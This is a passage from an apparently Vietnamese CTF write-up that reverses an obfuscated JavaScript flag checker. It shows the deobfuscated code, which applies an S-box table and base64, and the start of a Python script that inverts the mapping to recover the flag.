style="color:#a6e22e">_0x16be</span>(){<span style="color:#66d9ef">const</span> _0x4eae3d<span style="color:#f92672">=</span>[<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">1923945</span>aMREui<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">403288</span>ARWAZc<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">522465</span>dRWOJo<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">117</span>AUdDXf<span style="color:#e6db74">&#39;,&#39;</span>push<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">1266878</span>gdaSSP<span style="color:#e6db74">&#39;,&#39;</span>Incorrect<span style="color:#960050;background-color:#1e0010">\</span>x20flag<span style="color:#f92672">!</span><span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">4091610</span>cgcMNe<span style="color:#e6db74">&#39;,&#39;</span>fromCharCode<span style="color:#e6db74">&#39;,&#39;</span>random<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">9597917</span>yhcHtu<span style="color:#e6db74">&#39;,&#39;</span>charCodeAt<span style="color:#e6db74">&#39;,&#39;</span>log<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">12</span>qPopiU<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">/</span><span style="color:#ae81ff">52</span>NXNAD7Lui<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>G7idT7Dbue0L7vkV<span style="color:#f92672">/</span>bDey779tzuwf7c5G7c5HbDZHswUs<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">138664</span>SkZbmA<span style="color:#e6db74">&#39;,&#39;</span>floor<span style="color:#e6db74">&#39;,&#39;</span>length<span style="color:#e6db74">&#39;,&#39;</span>Good<span style="color:#960050;background-color:#1e0010">\</span>x20job,<span style="color:#960050;background-color:#1e0010">\</span>x20you<span style="color:#960050;background-color:#1e0010">\</span>x27re<span style="color:#960050;background-color:#1e0010">\</span>x20welcome<span style="color:#f92672">!!</span><span style="color:#960050;background-color:#1e0010">&#39;</span>];_0x16be<span style="color:#f92672">=</span><span style="color:#a6e22e">function</span>(){<span style="color:#66d9ef">return</span> _0x4eae3d;};<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_0x16be</span>();}
</span></span></code></pre></div><p>-&gt; JavaScript Obfuscate</p>
<p>Vậy, mình tiến hành thả đoạn code trên vào tool <a href="https://deobfuscate.relative.im/">deobfuscate</a> này để deobfuscate đoạn code trên.</p>
<p>Mình nhận được output như sau:</p>
<p><a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/pupu-flag-checker/pupu.js">pupu.js</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getRandomInt</span>(<span style="color:#a6e22e">min</span>, <span style="color:#a6e22e">max</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> Math.<span style="color:#a6e22e">floor</span>(Math.<span style="color:#a6e22e">random</span>() <span style="color:#f92672">*</span> (<span style="color:#a6e22e">max</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">min</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">+</span> <span style="color:#a6e22e">min</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">byteArrayToBase64</span>(<span style="color:#a6e22e">data</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">+</span> String.<span style="color:#a6e22e">fromCharCode</span>(<span style="color:#a6e22e">data</span>[<span style="color:#a6e22e">i</span>])
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">base64</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">value</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">base64</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">xorStrings</span>(<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">key</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">output</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">$116</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">$y</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">$118</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">$116</span> <span style="color:#f92672">^</span> <span style="color:#a6e22e">$y</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">output</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">output</span> <span style="color:#f92672">+</span> String.<span style="color:#a6e22e">fromCharCode</span>(<span style="color:#a6e22e">$118</span>)
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">output</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check</span>(<span style="color:#a6e22e">result</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> window <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">124</span>, <span style="color:#ae81ff">119</span>, <span style="color:#ae81ff">123</span>, <span style="color:#ae81ff">242</span>, <span style="color:#ae81ff">107</span>, <span style="color:#ae81ff">111</span>, <span style="color:#ae81ff">197</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">103</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">254</span>, <span style="color:#ae81ff">215</span>, <span style="color:#ae81ff">171</span>, <span style="color:#ae81ff">118</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">202</span>, <span style="color:#ae81ff">130</span>, <span style="color:#ae81ff">201</span>, <span style="color:#ae81ff">125</span>, <span style="color:#ae81ff">250</span>, <span style="color:#ae81ff">89</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">240</span>, <span style="color:#ae81ff">173</span>, <span style="color:#ae81ff">212</span>, <span style="color:#ae81ff">162</span>, <span style="color:#ae81ff">175</span>, <span style="color:#ae81ff">156</span>, <span style="color:#ae81ff">164</span>, <span style="color:#ae81ff">114</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">183</span>, <span style="color:#ae81ff">253</span>, <span style="color:#ae81ff">147</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">247</span>, <span style="color:#ae81ff">204</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">165</span>, <span style="color:#ae81ff">229</span>, <span style="color:#ae81ff">241</span>, <span style="color:#ae81ff">113</span>, <span style="color:#ae81ff">216</span>, <span style="color:#ae81ff">49</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">199</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">195</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">150</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">154</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">226</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">178</span>, <span style="color:#ae81ff">117</span>, <span style="color:#ae81ff">9</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">131</span>, <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">160</span>, <span style="color:#ae81ff">82</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">214</span>, <span style="color:#ae81ff">179</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">227</span>, <span style="color:#ae81ff">47</span>, <span style="color:#ae81ff">132</span>, <span style="color:#ae81ff">83</span>, <span style="color:#ae81ff">209</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">237</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">177</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">203</span>, <span style="color:#ae81ff">190</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">74</span>, <span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">207</span>, <span style="color:#ae81ff">208</span>, <span style="color:#ae81ff">239</span>, <span style="color:#ae81ff">170</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">251</span>, <span style="color:#ae81ff">67</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">133</span>, <span style="color:#ae81ff">69</span>, <span style="color:#ae81ff">249</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">127</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">159</span>, <span style="color:#ae81ff">168</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">163</span>, <span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">143</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">146</span>, <span style="color:#ae81ff">157</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">245</span>, <span style="color:#ae81ff">188</span>, <span style="color:#ae81ff">182</span>, <span style="color:#ae81ff">218</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">243</span>, <span style="color:#ae81ff">210</span>, <span style="color:#ae81ff">205</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">236</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">95</span>, <span style="color:#ae81ff">151</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">196</span>, <span style="color:#ae81ff">167</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">61</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">115</span>, <span style="color:#ae81ff">96</span>, <span style="color:#ae81ff">129</span>, <span style="color:#ae81ff">79</span>, <span style="color:#ae81ff">220</span>, <span style="color:#ae81ff">34</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">136</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">238</span>, <span style="color:#ae81ff">184</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">222</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">219</span>, <span style="color:#ae81ff">224</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">73</span>, <span style="color:#ae81ff">6</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">92</span>, <span style="color:#ae81ff">194</span>, <span style="color:#ae81ff">211</span>, <span style="color:#ae81ff">172</span>, <span style="color:#ae81ff">98</span>, <span style="color:#ae81ff">145</span>, <span style="color:#ae81ff">149</span>, <span style="color:#ae81ff">228</span>, <span style="color:#ae81ff">121</span>, <span style="color:#ae81ff">231</span>, <span style="color:#ae81ff">200</span>, <span style="color:#ae81ff">55</span>, <span style="color:#ae81ff">109</span>, <span style="color:#ae81ff">141</span>, <span style="color:#ae81ff">213</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">78</span>, <span style="color:#ae81ff">169</span>, <span style="color:#ae81ff">108</span>, <span style="color:#ae81ff">86</span>, <span style="color:#ae81ff">244</span>, <span style="color:#ae81ff">234</span>, <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">122</span>, <span style="color:#ae81ff">174</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">186</span>, <span style="color:#ae81ff">120</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">166</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">180</span>, <span style="color:#ae81ff">198</span>, <span style="color:#ae81ff">232</span>, <span style="color:#ae81ff">221</span>, <span style="color:#ae81ff">116</span>, <span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">189</span>, <span style="color:#ae81ff">139</span>, <span style="color:#ae81ff">138</span>, <span style="color:#ae81ff">112</span>, <span style="color:#ae81ff">62</span>, <span style="color:#ae81ff">181</span>, <span style="color:#ae81ff">102</span>, <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">3</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">246</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">134</span>, <span style="color:#ae81ff">193</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">158</span>, <span style="color:#ae81ff">225</span>, <span style="color:#ae81ff">248</span>, <span style="color:#ae81ff">152</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">105</span>, <span style="color:#ae81ff">217</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">142</span>, <span style="color:#ae81ff">148</span>, <span style="color:#ae81ff">155</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">135</span>, <span style="color:#ae81ff">233</span>, <span style="color:#ae81ff">206</span>, <span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">223</span>, <span style="color:#ae81ff">140</span>, <span style="color:#ae81ff">161</span>, <span style="color:#ae81ff">137</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">191</span>, <span style="color:#ae81ff">230</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">104</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">153</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">176</span>, <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">187</span>, <span style="color:#ae81ff">22</span>,
</span></span><span style="display:flex;"><span>  ]
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">44</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;Incorrect length!&#39;</span>)
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">options</span> <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (; <span style="color:#a6e22e">key</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">key</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#a6e22e">key</span>))
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0xfc20f8</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (; <span style="color:#a6e22e">_0xfc20f8</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">16</span>; <span style="color:#a6e22e">_0xfc20f8</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">options</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> window[<span style="color:#a6e22e">options</span>[<span style="color:#a6e22e">i</span>]]
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">byteArrayToBase64</span>(<span style="color:#a6e22e">options</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">value</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">value</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;/52NXNAD7Lui+5G7idT7Dbue0L7vkV/bDey779tzuwf7c5G7c5HbDZHswUs=&#39;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;Incorrect flag!&#39;</span>)
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;Good job, you&#39;re welcome!!&#34;</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Mọi thứ có vẻ đã rõ ràng hơn !
Tới đây, mảng chúng ta phải nhập vào phải có đúng 44 kí tự và sau đó được chuyển vào hàm <code>check()</code>.</p>
<p>Chương trình thực hiện 1 vòng lặp 16 lần, qua mỗi lần cập nhật <code> inputString[j] = xorValues[inputString[j]</code>, mỗi vòng như vậy thay đổi 44 kí tự của <code>inputString</code></p>
<p>Sau khi kết thúc, chuyển string này về base64 và so sánh với chuỗi đã cho <code>/52NXNAD7Lui+5G7idT7Dbue0L7vkV/bDey779tzuwf7c5G7c5HbDZHswUs=</code></p>
<p>-&gt; Sau đây là script mình giải bài này:</p>
<p><a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/pupu-flag-checker/pupu.py">pupu.py</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">124</span>, <span style="color:#ae81ff">119</span>, <span style="color:#ae81ff">123</span>, <span style="color:#ae81ff">242</span>, <span style="color:#ae81ff">107</span>, <span style="color:#ae81ff">111</span>, <span style="color:#ae81ff">197</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">103</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">254</span>, <span style="color:#ae81ff">215</span>, <span style="color:#ae81ff">171</span>, <span style="color:#ae81ff">118</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">202</span>, <span style="color:#ae81ff">130</span>, <span style="color:#ae81ff">201</span>, <span style="color:#ae81ff">125</span>, <span style="color:#ae81ff">250</span>, <span style="color:#ae81ff">89</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">240</span>, <span style="color:#ae81ff">173</span>, <span style="color:#ae81ff">212</span>, <span style="color:#ae81ff">162</span>, <span style="color:#ae81ff">175</span>, <span style="color:#ae81ff">156</span>, <span style="color:#ae81ff">164</span>, <span style="color:#ae81ff">114</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">183</span>, <span style="color:#ae81ff">253</span>, <span style="color:#ae81ff">147</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">247</span>, <span style="color:#ae81ff">204</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">165</span>, <span style="color:#ae81ff">229</span>, <span style="color:#ae81ff">241</span>, <span style="color:#ae81ff">113</span>, <span style="color:#ae81ff">216</span>, <span style="color:#ae81ff">49</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">199</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">195</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">150</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">154</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">226</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">178</span>, <span style="color:#ae81ff">117</span>, <span style="color:#ae81ff">9</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">131</span>, <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">160</span>, <span style="color:#ae81ff">82</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">214</span>, <span style="color:#ae81ff">179</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">227</span>, <span style="color:#ae81ff">47</span>, <span style="color:#ae81ff">132</span>, <span style="color:#ae81ff">83</span>, <span style="color:#ae81ff">209</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">237</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">177</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">203</span>, <span style="color:#ae81ff">190</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">74</span>, <span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">207</span>, <span style="color:#ae81ff">208</span>, <span style="color:#ae81ff">239</span>, <span style="color:#ae81ff">170</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">251</span>, <span style="color:#ae81ff">67</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">133</span>, <span style="color:#ae81ff">69</span>, <span style="color:#ae81ff">249</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">127</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">159</span>, <span style="color:#ae81ff">168</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">163</span>, <span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">143</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">146</span>, <span style="color:#ae81ff">157</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">245</span>, <span style="color:#ae81ff">188</span>, <span style="color:#ae81ff">182</span>, <span style="color:#ae81ff">218</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">243</span>, <span style="color:#ae81ff">210</span>, <span style="color:#ae81ff">205</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">236</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">95</span>, <span style="color:#ae81ff">151</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">196</span>, <span style="color:#ae81ff">167</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">61</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">115</span>, <span style="color:#ae81ff">96</span>, <span style="color:#ae81ff">129</span>, <span style="color:#ae81ff">79</span>, <span style="color:#ae81ff">220</span>, <span style="color:#ae81ff">34</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">136</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">238</span>, <span style="color:#ae81ff">184</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">222</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">219</span>, <span style="color:#ae81ff">224</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">73</span>, <span style="color:#ae81ff">6</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">92</span>, <span style="color:#ae81ff">194</span>, <span style="color:#ae81ff">211</span>, <span style="color:#ae81ff">172</span>, <span style="color:#ae81ff">98</span>, <span style="color:#ae81ff">145</span>, <span style="color:#ae81ff">149</span>, <span style="color:#ae81ff">228</span>, <span style="color:#ae81ff">121</span>, <span style="color:#ae81ff">231</span>, <span style="color:#ae81ff">200</span>, <span style="color:#ae81ff">55</span>, <span style="color:#ae81ff">109</span>, <span style="color:#ae81ff">141</span>, <span style="color:#ae81ff">213</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">78</span>, <span style="color:#ae81ff">169</span>, <span style="color:#ae81ff">108</span>, <span style="color:#ae81ff">86</span>, <span style="color:#ae81ff">244</span>, <span style="color:#ae81ff">234</span>, <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">122</span>, <span style="color:#ae81ff">174</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">186</span>, <span style="color:#ae81ff">120</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">166</span>,
